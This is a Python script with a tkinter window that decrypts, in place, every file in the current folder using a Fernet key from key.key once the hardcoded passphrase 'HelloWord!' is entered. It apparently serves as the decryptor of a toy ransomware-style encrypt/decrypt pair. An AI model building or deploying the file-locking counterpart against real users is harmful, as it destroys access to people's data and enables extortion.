import os
from cryptography.fernet import Fernet
import tkinter as tk

allfiles = []
for file in os.listdir():
    if file == "encode.py" or file == "key.key" or file == "decode.py":
        continue
    if os.path.isfile(file):
        allfiles.append(file)
#print(allfiles)

with open("key.key", "rb") as key:
    password = key.read()

passphrase = "HelloWord!"  # Convert passphrase to bytes

def check_password():
    user_input = userpass.get()  # Retrieve user input
    if user_input == passphrase:
        for file in allfiles:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            content_decr = Fernet(password).decrypt(contents)  # Decrypt the file content
            with open(file, "wb") as thefile:
                thefile.write(content_decr)
        label.config(text=f"All files has been decrypted.")
    else:
        label.config(text=f"Password invalid")




app = tk.Tk()
app.title("Decrypt files")

label = tk.Label(app, text="Enter password to decrypt")
label.pack(pady=40, padx=100)

userpass = tk.Entry(app)
userpass.pack(pady=20)

button = tk.Button(app, text="Check", command=check_password)
button.pack(pady=5)
	    
app.mainloop()
